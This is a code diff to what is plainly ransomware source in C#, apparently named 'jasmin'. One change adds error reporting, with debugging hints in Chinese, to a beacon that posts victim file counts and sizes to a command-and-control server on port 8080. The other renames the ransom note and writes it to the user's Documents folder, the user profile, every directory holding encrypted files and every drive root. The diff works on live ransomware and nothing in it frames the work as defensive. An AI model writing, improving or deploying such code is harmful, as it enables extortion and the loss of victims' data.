@@ -130,7 +130,11 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
       new("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
       new("total_size",(totalSz>0?totalSz:sz).ToString())};
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
-  }catch{}}
+  }catch(Exception ex){if(P_CONSOLE){try{
+    Console.Error.WriteLine("[jasmin] !!! 上报失败: "+C2);
+    Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
+    Console.Error.WriteLine("[jasmin] !!! 请检查回连地址、端口(本服务在 :8080)、握手密钥");
+  }catch{}}}}
 
 static string SID="";
 static string NOTE=@"
@@ -147,12 +151,12 @@ static void DropNotes(){
     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
   foreach(string d in dirs){
-    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_解密教程.txt"),txt);wrote++;}}catch{}}
+    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
   // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
   foreach(string d in NOTE_DIRS){
-    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_解密教程.txt"),txt);wrote++;}}catch{}}
+    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
   foreach(DriveInfo dr in DriveInfo.GetDrives()){
-    try{File.WriteAllText(dr.Name+"READ_ME_解密教程.txt",txt);wrote++;}catch{}}
+    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch{}}
   if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 勒索信已投放 "+wrote+" 处");}catch{}}
 }
 
